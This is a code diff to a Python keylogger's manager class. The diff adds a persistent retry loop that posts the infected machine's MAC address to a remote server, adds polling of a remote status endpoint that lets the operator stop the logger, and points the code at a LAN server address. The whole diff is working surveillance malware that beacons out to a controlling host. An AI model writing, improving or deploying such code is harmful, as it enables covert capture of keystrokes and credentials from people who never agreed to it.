@@ -1,3 +1,5 @@
+import urllib.parse
+
 import pygetwindow
 import requests
 from getmac import get_mac_address
@@ -23,7 +25,16 @@ class KeyLoggerManager:
         self.network_write = not file_write
         self.__instance = KeyloggerService(if_screenshot)
 
-        requests.post(server_link+'/send_mac', data=get_mac_address())
+        res_status = 0
+        while res_status != 200:
+            try:
+                res = requests.post(server_link + '/send_mac', data=get_mac_address())
+                res_status = res.status_code
+                time.sleep(3)
+            except:
+                pass
+            time.sleep(3)
+
 
 
 
@@ -75,8 +86,17 @@ class KeyLoggerManager:
         if self.__if_screenshot:
             threading.Thread(target=self.__thread_take_shot).start()
         while self.__instance.action:
-            self.stop()
-            time.sleep(0.1)
+            self.check_status(self.server_link+'/check_status')
+            time.sleep(3)
+
+    def check_status(self, link):
+        try:
+            params = urllib.parse.urlencode({'mac': get_mac_address()})
+            res = requests.get(f'{link}?{params}')
+            if res.status_code == 400:
+                self.__instance._KeyloggerService__change_action()
+        except:
+            pass
 
 
     def stop(self):
@@ -84,5 +104,5 @@ class KeyLoggerManager:
             self.__instance._KeyloggerService__change_action()
 
 
-server_link = "http://127.0.0.1:5000"
+server_link = "http://192.168.11.42:5000"
 KeyLoggerManager(server_link, if_screenshot=False, file_write=False).main()
